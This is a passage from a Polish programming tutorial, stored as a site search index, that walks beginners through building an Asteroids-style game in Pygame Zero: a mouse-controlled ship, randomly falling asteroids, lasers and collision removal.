pomoc\u0105 myszy.</p>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#tworzymy-statek","title":"Tworzymy statek","text":"<p>Naszego aktora tworzymy na g\u00f3rze, zaraz przed funkcj\u0105 draw. Utworzymy go na podstawie grafiki ship.png i zapiszemy w zmiennej ship.</p> <pre><code>ship = Actor(\"ship\")\n</code></pre> <p>Statek umie\u015bcimy na \u015brodku ekranu (\\(WIDTH / 2\\)), na samym dole z zachowaniem marginesu \\(60\\) pikseli (\\(HEIGHT - 60\\)).</p> <pre><code>ship = Actor(\"ship\")\nship.x = WIDTH / 2\nship.y = HEIGHT - 60\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#rysujemy-statek","title":"Rysujemy statek","text":"<p>Gdy ju\u017c mamy utworzonego aktora, mo\u017cemy go wy\u015bwietli\u0107 na ekranie. Dopisujemy instrukcj\u0119 rysuj\u0105c\u0105 statek (<code>ship.draw()</code>) na ko\u0144cu funkcji draw.</p> <pre><code>def draw():\n    ...\n    ship.draw()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#poruszamy-statkiem","title":"Poruszamy statkiem","text":"<p>Statkiem b\u0119dziemy porusza\u0107 w lewo/prawo. Nasza posta\u0107 b\u0119dzie sterowana za pomoc\u0105 myszki: statek b\u0119dzie lecia\u0142 w kierunku, w kt\u00f3rym znajduje si\u0119 wska\u017anik myszy. W tym celu musimy nada\u0107 naszemu statkowi jak\u0105\u015b pr\u0119dko\u015b\u0107 poziom\u0105. Dopiszemy wi\u0119c do naszego statku zmienn\u0105 vx z pocz\u0105tkow\u0105 warto\u015bci\u0105 np. \\(5\\), zaraz pod ustaleniem pozycji statku na ekranie.</p> <pre><code>ship.vx = 5\n</code></pre> <p>W cz\u0119\u015bci aktualizuj\u0105cej usuwamy instrukcj\u0119 pass. Na pocz\u0105tku odczytamy aktualn\u0105 pozycj\u0119 wska\u017anika myszy za pomoc\u0105 funkcji <code>pygame.mouse.get_pos()</code> z biblioteki pygame. Poniewa\u017c funkcja ta zwraca nam wsp\u00f3\u0142rz\u0119dne wska\u017anika myszy (\\(x\\) oraz \\(y\\)), to jej wynik zapiszemy w dw\u00f3ch zmiennych: mouse_x oraz mouse_y.</p> <pre><code>def update():\n    mouse_x, mouse_y = pygame.mouse.get_pos()\n</code></pre> <p>Teraz pozosta\u0142o nam sprawdzi\u0107, z kt\u00f3rej strony znajduje si\u0119 wska\u017anik myszy wzgl\u0119dem statku: z lewej czy z prawej. Je\u017celi wsp\u00f3\u0142rz\u0119dna \\(x\\) myszy jest mniejsza od wsp\u00f3\u0142rz\u0119dnej \\(x\\) statku, to znaczy, \u017ce mysz znajduje si\u0119 z lewej strony statku. Dopisujemy wi\u0119c instrukcj\u0119 warunkow\u0105 ze wspomnianym warunkiem na koniec funkcji update.</p> <pre><code>def update():\n    ...\n    if mouse_x &lt; ship.x:\n</code></pre> <p>Je\u017celi tak jest, to powinni\u015bmy statek przesun\u0105\u0107 w lewo zgodnie z jego pr\u0119dko\u015bci\u0105. W tym celu odejmujemy pr\u0119dko\u015b\u0107 statku (vx) od jego wsp\u00f3\u0142rz\u0119dnej \\(x\\).</p> <pre><code>def update():\n    ...\n    if mouse_x &lt; ship.x:\n        ship.x -= ship.vx\n</code></pre> <p>Podobnie post\u0119pujemy przy ruchu w praw\u0105 stron\u0119. Zaczynamy od warunku: sprawdzamy, czy wsp\u00f3\u0142rz\u0119dna \\(x\\) myszy jest wi\u0119ksza od wsp\u00f3\u0142rz\u0119dnej \\(x\\) statku.</p> <pre><code>def update():\n    ...\n    if mouse_x &gt; ship.x:\n</code></pre> <p>Poruszamy statkiem w prawo, tzn. dodajemy jego pr\u0119dko\u015b\u0107 do pozycji \\(x\\).</p> <pre><code>def update():\n    ...\n    if mouse_x &gt; ship.x:\n        ship.x += ship.vx\n</code></pre> <p>Pe\u0142na funkcja update b\u0119dzie wi\u0119c wygl\u0105da\u0142a tak jak poni\u017cej.</p> <pre><code>def update():\n    mouse_x, mouse_y = pygame.mouse.get_pos()\n    if mouse_x &lt; ship.x:\n        ship.x -= ship.vx\n    if mouse_x &gt; ship.x:\n        ship.x += ship.vx\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#peny-kod_1","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport pygame\nimport random\n\nWIDTH = 600\nHEIGHT = 900\n\nship = Actor(\"ship\")  # Tworzymy nowego aktora reprezentuj\u0105cego statek\nship.x = WIDTH / 2  # Ustawiamy pozycj\u0119 poziom\u0105 statku na po\u0142ow\u0119 szeroko\u015bci ekranu\nship.y = HEIGHT - 60  # Ustawiamy statek na dole ekranu, z niewielkim marginesem\nship.vx = 5  # Zapami\u0119tujemy pr\u0119dko\u015b\u0107 poziom\u0105 statku\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    ship.draw()  # Rysujemy statek na ekranie\n\ndef update():\n    mouse_x, mouse_y = pygame.mouse.get_pos()  # Odczytujemy obecn\u0105 pozycj\u0119 wska\u017anika myszy\n    if mouse_x &lt; ship.x:  # Je\u017celi wska\u017anik myszy jest z lewej strony statku\n        ship.x -= ship.vx  # Przemieszczamy statek w lewo zgodnie z jego pr\u0119dko\u015bci\u0105\n\n    if mouse_x &gt; ship.x:  # Je\u017celi wska\u017anik myszy jest z prawej strony statku\n        ship.x += ship.vx  # Przemieszczamy statek w prawo zgodnie z jego pr\u0119dko\u015bci\u0105\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#asteroidy_1","title":"Asteroidy","text":"<p>G\u0142\u00f3wne zagro\u017cenie w naszej grze b\u0119d\u0105 stanowi\u0107 asteroidy \"spadaj\u0105ce\" z g\u00f3ry ekranu.</p>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#przygotowujemy-asteroidy","title":"Przygotowujemy asteroidy","text":"<p>Czas przygotowa\u0107 asteroidy. Chcemy, aby by\u0142o w grze wy\u015bwietla\u0142o si\u0119 kilka asteroid naraz.  W tym celu potrzebna nam b\u0119dzie lista. Lista pozwala nam przechowywa\u0107 wiele element\u00f3w jeden po drugim, zapisanych w jednej zmiennej o typie listy w\u0142a\u015bnie. Na pocz\u0105tku tworzymy pust\u0105 list\u0119, kt\u00f3r\u0105 przechowamy w zmiennej asteroids_list. W celu utworzenia pustej listy do naszej zmiennej przypiszemy puste nawiasy kwadratowe: []. Now\u0105 zmienn\u0105 utworzymy pod statkiem, czyli zaraz nad funkcj\u0105 draw.</p> <pre><code>asteroids_list = []\n</code></pre> <p>Teraz utworzymy funkcj\u0119, za pomoc\u0105 kt\u00f3rej b\u0119dziemy dodawa\u0107 losowe asteroidy w trakcie trwania gry. Na pocz\u0105tku asteroid b\u0119dzie znajdowa\u0142 si\u0119 nad ekranem, tak by efekt \"spadania\" wygl\u0105da\u0142 naturalniej. Na ko\u0144cu naszego kodu, zaraz przed instrukcj\u0105 pgzrun.go() tworzymy now\u0105 funkcj\u0119 add_asteroid.</p> <pre><code>def add_asteroid():\n</code></pre> <p>Na pocz\u0105tku utworzymy nowego aktora z grafiki asteroid1.png i zapiszemy go w zmiennej asteroid.</p> <pre><code>def add_asteroid():\n    asteroid = Actor(\"asteroid1\")\n</code></pre> <p>Przypiszmy teraz naszej asteroidzie w\u0142a\u015bciwe wsp\u00f3\u0142rz\u0119dne. Jako wsp\u00f3\u0142rz\u0119dn\u0105 \\(x\\) przyjmiemy losow\u0105 warto\u015b\u0107 z przedzia\u0142u \\(&lt;20, WIDTH-20&gt;\\) wylosowan\u0105 za pomoc\u0105 funkcji <code>random.randint</code> z biblioteki random.</p> <pre><code>def add_asteroid():\n    ...\n    asteroid.x = random.randint(20, WIDTH-20)\n</code></pre> <p>Do wsp\u00f3\u0142rz\u0119dnej \\(y\\) przypiszemy warto\u015b\u0107 \\(-10\\), tak by nowa asteroida znalaz\u0142a si\u0119 ponad g\u00f3rn\u0105 kraw\u0119dzi\u0105 ekranu.</p> <pre><code>def add_asteroid():\n    ...\n    asteroid.y = -10\n</code></pre> <p>Teraz pozosta\u0142o nam wylosowa\u0107 pr\u0119dko\u015b\u0107 pionow\u0105, kt\u00f3r\u0105 zapiszemy w asteroidzie w zmiennej \\(vy\\). Warto\u015b\u0107 pr\u0119dko\u015bci pionowej wylosujemy z przedzia\u0142u \\(&lt;2, 10&gt;\\), ponownie korzystaj\u0105c z funkcji <code>random.randint</code>.</p> <pre><code>def add_asteroid():\n    ...\n    asteroid.vy = random.randint(2, 10)\n</code></pre> <p>Pozosta\u0142o nam dopisa\u0107 nasz\u0105 now\u0105 asteroid\u0119 do listy asteroid. W tym celu skorzystamy z metody append, kt\u00f3ra dodaje nowy element do listy. Metod\u0119 t\u0119 wywo\u0142amy pisz\u0105c <code>asteroids_list.append</code> w nawiasach podaj\u0105c nasz\u0105 now\u0105 asteroid\u0119.</p> <pre><code>def add_asteroid():\n    ...\n    asteroids_list.append(asteroid)\n</code></pre> <p>Nasza pe\u0142na funkcja add_asteroid przedstawiona jest poni\u017cej.</p> <pre><code>def add_asteroid():\n    asteroid = Actor(\"asteroid1\")\n    asteroid.x = random.randint(20, WIDTH-20)\n    asteroid.y = -10\n    asteroid.vy = random.randint(2, 10)\n    asteroids_list.append(asteroid)\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#dodajemy-losowo-asteroidy","title":"Dodajemy losowo asteroidy","text":"<p>W cz\u0119\u015bci aktualizuj\u0105cej (update) b\u0119dziemy losowo dodawa\u0107 asteroidy w ka\u017cdej klatce, z odpowiednio ma\u0142ym prawdopodobie\u0144stwem. W tym celu sprawdzimy, czy wylosowana liczba rzeczywista z przedzia\u0142u \\(&lt;0, 1)\\) jest mniejsza od jakiej\u015b ustalonej warto\u015bci, np. \\(0.02\\). Liczb\u0119 rzeczywist\u0105 wylosujemy za pomoc\u0105 funkcji <code>random.random()</code>. Instrukcj\u0119 warunkow\u0105 z wspomnianym warunkiem dopisujemy na ko\u0144cu funkcji update.</p> <pre><code>def update():\n    ...\n    if random.random() &lt; 0.02:\n</code></pre> <p>Je\u017celi warunek jet spe\u0142niony to dodamy now\u0105 asteroid\u0119 wywo\u0142uj\u0105c nasz\u0105 funkcj\u0119 add_asteroid.</p> <pre><code>def update():\n    ...\n    if random.random() &lt; 0.02:\n        add_asteroid()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#rysujemy-asteroidy","title":"Rysujemy asteroidy","text":"<p>Teraz zajmiemy si\u0119 rysowaniem asteroid na ekranie. W tym celu w cz\u0119\u015bci rysuj\u0105cej (draw) musimy ponownie przej\u015b\u0107 przez ca\u0142\u0105 list\u0119 i narysowa\u0107 ka\u017cd\u0105 asteroid\u0119 osobno. Wewn\u0105trz funkcji draw, zaraz po wype\u0142nieniu ekranu grafik\u0105 t\u0142a, a przed narysowaniem statku (tak \u017ceby statek by\u0142 zawsze na wierzchu), dopisujemy p\u0119tl\u0119 przechodz\u0105c\u0105 przez ka\u017cd\u0105 asteroid\u0119 z listy asteroid.</p> <pre><code>def draw():\n    ...\n    for asteroid in asteroids_list:\n    ...\n</code></pre> <p>Wewn\u0105trz p\u0119tli rysujemy asteroidy wywo\u0142uj\u0105c metod\u0119 draw na zmiennej asteroid.</p> <pre><code>def draw():\n    ...\n    for asteroid in asteroids_list:\n        asteroid.draw()\n    ...\n</code></pre> <p>Pe\u0142na funkcja rysuj\u0105ca pokazana jest poni\u017cej.</p> <pre><code>def draw():\n    screen.blit(\"bg\", (0, 0))\n    for asteroid in asteroids_list:\n        asteroid.draw()\n\n    ship.draw()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#przemieszczamy-asteroidy","title":"Przemieszczamy asteroidy","text":"<p>Teraz czas na aktualizacj\u0119 pozycji asteroid. W tym celu musimy przej\u015b\u0107 przez wszystkie elementy naszej listy i dla ka\u017cdego wykona\u0107 odpowiednie operacje. Robimy to w cz\u0119\u015bci aktualizuj\u0105cej. </p> <p>Poniewa\u017c b\u0119dziemy usuwa\u0107 asteroidy, kt\u00f3re wylecia\u0142y poza ekran, to w p\u0119tli musimy przej\u015b\u0107 przez kopi\u0119 listy asteroid, kt\u00f3r\u0105 tworzymy pisz\u0105c dwukropek w nawiasach kwadratowych po nazwie listy: <code>asteroids_list[:]</code>.</p> <p>Dla zachowania porz\u0105dku aktualizacj\u0119 asteroid zapiszemy w nowej funkcji update_asteroids, kt\u00f3r\u0105 utworzymy zaraz pod funkcj\u0105 update.</p> <pre><code>def update_asteroids():\n</code></pre> <p>Zaczynamy od napisania p\u0119tli przechodz\u0105cej przez wszystkie asteroidy w kopii listy.</p> <pre><code>def update_asteroids():\n    for asteroid in asteroids_list[:]:\n</code></pre> <p>Dla ka\u017cdej asteroidy b\u0119dziemy przemieszcza\u0107 j\u0105 zgodnie z jej pr\u0119dko\u015bci\u0105, wi\u0119c do jej wsp\u00f3\u0142rz\u0119dnej \\(y\\) dodajemy jej pr\u0119dko\u015b\u0107 vy.</p> <pre><code>def update_asteroids():\n    for asteroid in asteroids_list[:]:\n        asteroid.y += asteroid.vy\n</code></pre> <p>\u017beby nasza gra nie spowalnia\u0142a po pewnym czasie, powinni\u015bmy na bie\u017c\u0105co usuwa\u0107 asteroidy, kt\u00f3rych ju\u017c nie wida\u0107 na ekranie. Dlatego dopisujemy w p\u0119tli instrukcj\u0119 warunkow\u0105 sprawdzaj\u0105c\u0105, czy asteroida wylecia\u0142a poza ekran, tzn. czy jej wsp\u00f3\u0142rz\u0119dna \\(y\\) jest wi\u0119ksza od \\(HEIGHT + 50\\) (dodajemy \\(50\\) tak by ca\u0142a asteroida zd\u0105\u017cy\u0142a wylecie\u0107 poza ekran).</p> <pre><code>def update_asteroids():\n    for asteroid in asteroids_list[:]:\n        asteroid.y += asteroid.vy\n        if asteroid.y &gt; HEIGHT + 50:\n</code></pre> <p>Je\u017celi asteroida opu\u015bci\u0142a ekran gry to usuwamy j\u0105 z listy za pomoc\u0105 metody remove, jako argument podaj\u0105c asteroid\u0119 do usuni\u0119cia, podobnie jak robili\u015bmy przy dodawaniu asteroidy do listy.</p> <pre><code>def update_asteroids():\n    for asteroid in asteroids_list[:]:\n        asteroid.y += asteroid.vy\n        if asteroid.y &gt; HEIGHT + 50:\n            asteroids_list.remove(asteroid)\n</code></pre> <p>Pozosta\u0142o nam wywo\u0142a\u0107 nasz\u0105 now\u0105 funkcj\u0119 na ko\u0144cu funkcji update.</p> <pre><code>def update():\n    ...\n    update_asteroids()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#peny-kod_2","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport pygame\nimport random\n\nWIDTH = 600\nHEIGHT = 900\n\nship = Actor(\"ship\")\nship.x = WIDTH / 2\nship.y = HEIGHT - 60\nship.vx = 5\n\nasteroids_list = []  # Lista, w kt\u00f3rej zapisujemy wszystkie asteroidy\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    for asteroid in asteroids_list:  # Przechodzimy p\u0119tl\u0105 przez wszystkie asteroidy\n        asteroid.draw()  # Rysujemy asteroid\u0119 na ekranie gry\n\n    ship.draw()\n\ndef update():\n    mouse_x, mouse_y = pygame.mouse.get_pos()\n    if mouse_x &lt; ship.x:\n        ship.x -= ship.vx\n\n    if mouse_x &gt; ship.x:\n        ship.x += ship.vx\n\n    if random.random() &lt; 0.02:  # Je\u017celi wylosowali\u015bmy odpowiednio ma\u0142\u0105 liczb\u0119\n        add_asteroid()  # Dodajemy now\u0105 asteroid\u0119 do gry\n\n    update_asteroids()  # Aktualizujemy pozycje asteroid\n\ndef update_asteroids():  # Pomocnicza funkcja aktualizuj\u0105ca pozycj\u0119 asteroid\n    for asteroid in asteroids_list[:]:  # Przechodzimy przez kopi\u0119 listy asteroid\n        asteroid.y += asteroid.vy  # Przemieszczamy asteroid\u0119 zgodnie z jej pr\u0119dko\u015bci\u0105\n        if asteroid.y &gt; HEIGHT + 50:  # Je\u017celi asteroida wylecia\u0142a poza ekran\n            asteroids_list.remove(asteroid)  # Usuwamy j\u0105 z listy asteroid\n\ndef add_asteroid():  # Pomocnicza funkcja dodaj\u0105ca now\u0105 asteroid\u0119 do gry\n    asteroid = Actor(\"asteroid1\")  # Tworzymy nowego aktora reprezentuj\u0105cego asteroid\u0119\n    asteroid.x = random.randint(20, WIDTH-20)  # Ustawiamy losow\u0105 pozycj\u0119 poziom\u0105 asteroidy\n    asteroid.y = -10  # Ustawiamy pionow\u0105 pozycj\u0119 asteroidy tak, by by\u0142a poza ekranem gry\n    asteroid.vy = random.randint(2, 10)  # Ustawiamy losow\u0105 pozycj\u0119 asteroidy\n    asteroids_list.append(asteroid)  # Dodajemy now\u0105 asteroid\u0119 do listy asteroid\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#lasery","title":"Lasery","text":"<p>Nasz statek b\u0119dzie strzela\u0142 laserami. To one b\u0119d\u0105 pozwala\u0142y zniszczy\u0107 asteroidy, kt\u00f3re stanowi\u0105 zagro\u017cenie.</p>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#przygotowujemy-lasery","title":"Przygotowujemy lasery","text":"<p>Podobnie jak asteroidy, tak\u017ce lasery b\u0119dziemy przechowywa\u0107 w li\u015bcie. Tworzymy wi\u0119c now\u0105 pust\u0105 list\u0119, kt\u00f3r\u0105 nazwiemy lasers_list i umie\u015bcimy zaraz pod list\u0105 asteroid.</p> <pre><code>lasers_list = []\n</code></pre> <p>Teraz przyda nam si\u0119 funkcja, kt\u00f3ra pos\u0142u\u017cy nam do dodawania nowych laser\u00f3w do listy. Stworzymy wi\u0119c pomocnicz\u0105 funkcj\u0119 add_laser, kt\u00f3r\u0105 umie\u015bcimy zaraz pod funkcj\u0105 add_asteroid.</p> <pre><code>def add_laser():\n</code></pre> <p>Na pocz\u0105tku funkcji utworzymy nowego aktora z grafiki laser.png i zapiszemy go w zmiennej o nazwie laser.</p> <pre><code>def add_laser():\n    laser = Actor(\"laser\")\n</code></pre> <p>Teraz ustalimy pocz\u0105tkow\u0105 pozycj\u0119 naszego lasera. Chcemy, \u017ceby by\u0142a taka sama jak pozycja statku, poniewa\u017c to za jego pomoc\u0105 strzelamy. W zwi\u0105zku z tym do pozycji lasera (laser.pos) przypiszemy pozycj\u0119 statku (ship.pos).</p> <pre><code>def add_laser():\n    ...\n    laser.pos = ship.pos\n</code></pre> <p>Naszemu laserowi powinni\u015bmy tak\u017ce nada\u0107 jak\u0105\u015b pr\u0119dko\u015b\u0107 pionow\u0105 (laser.vy), np. \\(-8\\), by laser porusza\u0142 si\u0119 do g\u00f3ry.</p> <pre><code>def add_laser():\n    ...\n    laser.vy = -8\n</code></pre> <p>Wreszcie na ko\u0144cu dodajemy nasz nowy laser do listy laser\u00f3w (lasers_list) za pomoc\u0105 metody append.</p> <pre><code>def add_laser():\n    ...\n    lasers_list.append(laser)\n</code></pre> <p>Pe\u0142na funkcja dodaj\u0105ca nowy laser przedstawiona jest poni\u017cej.</p> <pre><code>def add_laser():\n    laser = Actor(\"laser\")\n    laser.pos = ship.pos\n    laser.vy = -8\n    lasers_list.append(laser)\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#rysujemy-lasery","title":"Rysujemy lasery","text":"<p>Zanim przejdziemy do strzelania, narysujmy nasze lasery na ekranie. Oczywi\u015bcie jeszcze nie mamy laser\u00f3w do narysowania, ale gdy ju\u017c b\u0119dziemy mogli strzela\u0107, to je zobaczymy. Wewn\u0105trz funkcji <code>draw</code>, zaraz przed narysowaniem statku, a pod narysowaniem asteroid, dopisujemy p\u0119tl\u0119 przechodz\u0105c\u0105 przez wszystkie lasery na li\u015bcie lasers_list.</p> <pre><code>def draw():\n    ...\n    for laser in lasers_list:\n    ...\n</code></pre> <p>Wewn\u0105trz p\u0119tli b\u0119dziemy rysowa\u0107 nasze lasery.</p> <pre><code>def draw():\n    ...\n    for laser in lasers_list:\n        laser.draw()\n    ...\n</code></pre> <p>Pe\u0142na funkcja rysuj\u0105ca pokazana jest poni\u017cej.</p> <pre><code>def draw():\n    screen.blit(\"bg\", (0, 0))\n    for asteroid in asteroids_list:\n        asteroid.draw()\n\n    for laser in lasers_list:\n        laser.draw()\n\n    ship.draw()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#strzelamy","title":"Strzelamy","text":"<p>Czas na strzelanie laserami! Strza\u0142y b\u0119dziemy oddawa\u0107 po ka\u017cdym klikni\u0119ciu myszy. Klikni\u0119cia myszy odczytujemy za pomoc\u0105 funkcji on_mouse_down z biblioteki Pygame Zero. Dopisujemy wi\u0119c now\u0105 funkcj\u0119, na ko\u0144cu naszego kodu, zaraz przed instrukcj\u0105 <code>pgzrun.go()</code>.</p> <pre><code>def on_mouse_down(pos):\n</code></pre> <p>Wewn\u0105trz funkcji wywo\u0142amy nasz\u0105 funkcj\u0119 add_laser, aby doda\u0107 nowy laser do gry.</p> <pre><code>def on_mouse_down(pos):\n    add_laser()\n</code></pre> <p>Warto tak\u017ce skorzysta\u0107 z d\u017awi\u0119ku laser pisz\u0105c instrukcj\u0119 <code>sounds.laser.play()</code>.</p> <pre><code>def on_mouse_down(pos):\n    add_laser()\n    sounds.laser.play()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#przemieszczamy-lasery","title":"Przemieszczamy lasery","text":"<p>W tym momencie nasze lasery s\u0105 do\u015b\u0107 statyczne. Chcieliby\u015bmy, \u017ceby si\u0119 porusza\u0142y, jak to lasery maj\u0105 w zwyczaju, a przynajmniej tak przedstawiaj\u0105 to filmy science-fiction. Z laserami post\u0105pimy podobnie jak z asteroidami i dodamy now\u0105 funkcj\u0119 update_lasers, kt\u00f3r\u0105 dla zachowania porz\u0105dku dopiszemy zaraz pod funkcj\u0105 update_asteroids.</p> <pre><code>def update_lasers():\n</code></pre> <p>Chcemy aktualizowa\u0107 pozycj\u0119 wszystkich laser\u00f3w, potrzebna nam wi\u0119c p\u0119tla przechodz\u0105ca przez wszystkie lasery na li\u015bcie lasers_list. Nasze lasery b\u0119dziemy jednak usuwa\u0107, gdy wylec\u0105 poza ekran, wi\u0119c potrzebna nam kopia listy, kt\u00f3r\u0105 tworzymy pisz\u0105c lasers_list[:], podobnie jak w przypadku asteroid.</p> <pre><code>def update_lasers():\n    for laser in lasers_list[:]:\n</code></pre> <p>Wewn\u0105trz p\u0119tli przemieszczamy nasz laser zgodnie z jego pr\u0119dko\u015bci\u0105, wi\u0119c do wsp\u00f3\u0142rz\u0119dnej \\(y\\) dodajemy pr\u0119dko\u015b\u0107 pionow\u0105 lasera (laser.vy).</p> <pre><code>def update_lasers():\n    for laser in lasers_list[:]:\n        laser.y += laser.vy\n</code></pre> <p>Teraz pora sprawdzi\u0107, czy laser wylecia\u0142 poza ekran. W tym celu sprawdzimy, czy jego pozycja \\(y\\) jest mniejsza od ujemnej warto\u015bci jego wysoko\u015bci. W ten spos\u00f3b upewnimy si\u0119, \u017ce ca\u0142y laser wylecia\u0142 poza ekran, a nie tylko jego cz\u0119\u015b\u0107. Wysoko\u015b\u0107 lasera mo\u017cemy odczyta\u0107 pisz\u0105c <code>laser.height</code>. Dopisujemy wi\u0119c instrukcj\u0119 warunkow\u0105.</p> <pre><code>def update_lasers():\n    for laser in lasers_list[:]:\n        laser.y += laser.vy\n        if laser.y &lt; -laser.height:\n</code></pre> <p>Je\u017celi laser wyleci poza ekran, to chcemy go usun\u0105\u0107 z listy laser\u00f3w i tym samym z naszej gry. Korzystamy wi\u0119c z metody remove, tak jak wcze\u015bniej przy asteroidach.</p> <pre><code>def update_lasers():\n    for laser in lasers_list[:]:\n        laser.y += laser.vy\n        if laser.y &lt; -laser.height:\n            lasers_list.remove(laser)\n</code></pre> <p>Pozosta\u0142o nam wywo\u0142a\u0107 nasz\u0105 now\u0105 funkcj\u0119 na ko\u0144cu funkcji update, tak by nasze lasery by\u0142y aktualizowane.</p> <pre><code>def update():\n    ...\n    update_lasers()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#niszczymy-asteroidy","title":"Niszczymy asteroidy","text":"<p>C\u00f3\u017c to za lasery, kt\u00f3re nie niszcz\u0105 asteroid? Mo\u017cna powiedzie\u0107, \u017ce s\u0105 to ca\u0142kowicie normalne lasery, ale nie w naszej grze! Czas zniszczy\u0107 kilka asteroid. W tym celu utworzymy now\u0105 funkcj\u0119 update_lasers_hits, kt\u00f3r\u0105 dopiszemy zaraz pod nasz\u0105 poprzedni\u0105 funkcj\u0105 update_lasers.</p> <pre><code>def update_lasers_hits():\n</code></pre> <p>Dla ka\u017cdego laseru b\u0119dziemy sprawdza\u0107, czy trafi\u0142 on w kt\u00f3r\u0105\u015b z asteroid. Je\u017celi tak, to usuniemy zar\u00f3wno laser jak i asteroid\u0119. Dopisujemy wi\u0119c p\u0119tl\u0119, kt\u00f3ra przejdzie przez wszystkie lasery w kopii listy lasers_list.</p> <pre><code>def update_lasers_hits():\n    for laser in lasers_list[:]:\n</code></pre> <p>Asteroid mamy wiele, jak wi\u0119c sprawdzi\u0107, czy w kt\u00f3r\u0105\u015b trafi\u0142 laser? Potrzebna nam kolejna p\u0119tla, kt\u00f3ra przejdzie przez wszystkie asteroidy w kopii listy asteroids_list.</p> <pre><code>def update_lasers_hits():\n    for laser in lasers_list[:]:\n        for asteroid in asteroids_list[:]:\n</code></pre> <p>Mamy ju\u017c zar\u00f3wno laser jak i asteroid\u0119. Sprawd\u017amy wi\u0119c, czy s\u0105 w kolizji! W tym celu skorzystamy ze znanej nam funkcji colliderect.</p> <pre><code>def update_lasers_hits():\n    for laser in lasers_list[:]:\n        for asteroid in asteroids_list[:]:\n            if laser.colliderect(asteroid):\n</code></pre> <p>Je\u017celi laser trafi\u0142 w asteroid\u0119, to usuwamy zar\u00f3wno laser jak i asteroid\u0119 z odpowiednich list za pomoc\u0105 metody remove.</p> <pre><code>def update_lasers_hits():\n    for laser in lasers_list[:]:\n        for asteroid in asteroids_list[:]:\n            if laser.colliderect(asteroid):\n                lasers_list.remove(laser)\n                asteroids_list.remove(asteroid)\n</code></pre> <p>Dopiszmy teraz wywo\u0142anie naszej nowej funkcji na koniec funkcji update.</p> <pre><code>def update():\n    ...\n    update_lasers_hits()\n</code></pre> <p>Gdyby\u015bmy teraz przetestowali nasz\u0105 gr\u0119, to mo\u017ce si\u0119 zdarzy\u0107, \u017ce czasem wy\u0142\u0105czy si\u0119 z komunikatem b\u0142\u0119du w konsoli. Dzieje si\u0119 tak, gdy laser trafi w jedn\u0105 asteroid\u0119, usuniemy go z listy, ale jest tak\u017ce jednocze\u015bnie w kolizji z jeszcze inn\u0105 asteroid\u0105. W\u00f3wczas spr\u00f3bujemy usun\u0105\u0107 ten sam laser drugi raz, ale przecie\u017c ju\u017c go wcze\u015bniej usun\u0119li\u015bmy, wi\u0119c pr\u00f3ba usuni\u0119cia usuni\u0119tego lasera zako\u0144czy si\u0119 b\u0142\u0119dem. Mo\u017cemy jednak temu zapobiec w bardzo prosty spos\u00f3b. Wystarczy \u017ce dopiszemy do naszej funkcji update_lasers_hits instrukcj\u0119 break zaraz po usuni\u0119ciu lasera i asteroidy. Instrukcja break sprawi, \u017ce wyjdziemy z p\u0119tli przechodz\u0105cej po wszystkich asteroidach i przejdziemy do kolejnego lasera.</p> <pre><code>def update_lasers_hits():\n    for laser in lasers_list[:]:\n        for asteroid in asteroids_list[:]:\n            if laser.colliderect(asteroid):\n                lasers_list.remove(laser)\n                asteroids_list.remove(asteroid)\n                break\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#peny-kod_3","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport pygame\nimport random\n\nWIDTH = 600\nHEIGHT = 900\n\nship = Actor(\"ship\")\nship.x = WIDTH / 2\nship.y = HEIGHT - 60\nship.vx = 5\n\nasteroids_list = []\nlasers_list = []  # Lista, w kt\u00f3rej zapisujemy wszystkie lasery\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    for asteroid in asteroids_list:\n        asteroid.draw()\n\n    for laser in lasers_list:  # Przechodzimy przez wszystkie lasery na li\u015bcie\n        laser.draw()  # Rysujemy laser na ekranie gry\n\n    ship.draw()\n\ndef update():\n    mouse_x, mouse_y = pygame.mouse.get_pos()\n    if mouse_x &lt; ship.x:\n        ship.x -= ship.vx\n\n    if mouse_x &gt; ship.x:\n        ship.x += ship.vx\n\n    if random.random() &lt; 0.02:\n        add_asteroid()\n\n    update_asteroids()\n    update_lasers()  # Aktualizujemy pozycje laser\u00f3w\n    update_lasers_hits()  # Aktualizujemy trafienia laser\u00f3w w asteroidy\n\ndef update_asteroids():\n    for asteroid in asteroids_list[:]:\n        asteroid.y += asteroid.vy\n        if asteroid.y &gt; HEIGHT + 50:\n            asteroids_list.remove(asteroid)\n\ndef update_lasers():  # Pomocnicza funkcja aktualizuj\u0105ca pozycje laser\u00f3w\n    for laser in lasers_list[:]:  # Przechodzimy przez wszystkie lasery na li\u015bcie\n        laser.y += laser.vy  # Przemieszczamy laser zgodnie z jego pr\u0119dko\u015bci\u0105\n        if laser.y &lt; -laser.height:  # Je\u017celi laser wylecia\u0142 poza ekran\n            lasers_list.remove(laser)  # Usuwamy laser z gry\n\ndef update_lasers_hits():  # Pomocnicza funkcja sprawdzaj\u0105ca uderzenia laser\u00f3w w asteroidy\n    for laser in lasers_list[:]:  # Przechodzimy przez wszystkie lasery na li\u015bcie\n        for asteroid in asteroids_list[:]:  # Przechodzimy przez wszystkie asteroidy na li\u015bcie\n            if laser.colliderect(asteroid):  # Sprawdzamy, czy laser trafi\u0142 w asteroid\u0119\n                